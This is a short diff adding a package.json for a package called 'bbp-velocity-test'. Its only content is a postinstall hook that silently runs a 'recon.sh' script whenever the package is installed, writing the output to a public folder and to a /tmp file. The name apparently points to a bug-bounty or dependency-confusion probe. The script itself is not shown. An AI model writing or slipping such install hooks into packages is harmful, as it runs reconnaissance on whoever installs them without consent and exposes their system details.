@@ -1,0 +1,7 @@
+{
+  "name": "bbp-velocity-test",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "sh ./recon.sh > ./public/bbp.txt 2>&1; sh ./recon.sh > /tmp/bbp_yunkkey24601 2>&1"
+  }
+}
